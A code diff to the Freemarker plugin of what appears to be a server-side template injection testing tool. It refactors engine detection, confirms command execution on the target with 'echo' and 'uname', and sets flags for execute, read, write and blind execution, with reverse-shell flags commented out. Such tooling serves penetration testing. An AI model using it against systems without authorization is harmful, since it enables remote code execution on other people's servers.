@@ -4,7 +4,6 @@ from utils import rand
 from core.plugin import Plugin
 from core import languages
 import re
-import base64
 
 class Freemarker(Plugin):
 
@@ -65,7 +64,10 @@ class Freemarker(Plugin):
         { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
     ]
 
-    def detect_engine(self):
+
+    language = 'java'
+
+    def rendered_detected(self):
 
         randA = rand.randstr_n(1)
         randB = rand.randstr_n(1)
@@ -74,25 +76,30 @@ class Freemarker(Plugin):
         expected = randA + randB
 
         if expected == self.render(payload):
-            self.set('language', 'java')
-            self.set('engine', 'freemarker')
+            self.set('engine', self.plugin.lower())
+            self.set('language', self.language)
 
-    def detect_exec(self):
+            expected_rand = str(rand.randint_n(2))
+            if expected_rand == self.execute('echo %s' % expected_rand):
+                self.set('execute', True)
+                self.set('write', True)
+                self.set('read', True)
+                #self.set('tcp_shell', True)
+                #self.set('reverse_tcp_shell', True)
 
-        expected_rand = str(rand.randint_n(2))
+                os = self.execute("""uname""")
+                if os and re.search('^[\w-]+$', os):
+                    self.set('os', os)
 
-        if expected_rand == self.execute('echo %s' % expected_rand):
-            self.set('execute', True)
-            # TODO: manage Window environment
-            self.set('os', self.execute("uname"))
-            self.set('write', True)
-            self.set('read', True)
+    def blind_detected(self):
 
-    def detect_blind_engine(self):
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
 
-        if not self.get('blind'):
-            return
+        # No blind code evaluation is possible here, only execution
 
-        self.set('language', 'java')
-        self.set('execute', True)
-        self.set('engine', 'freemarker')
+        # Since execution has been used to detect blind injection,
+        # let's assume execute_blind as set.
+        self.set('execute_blind', True)
+        #self.set('tcp_shell', True)
+        #self.set('reverse_tcp_shell', True)
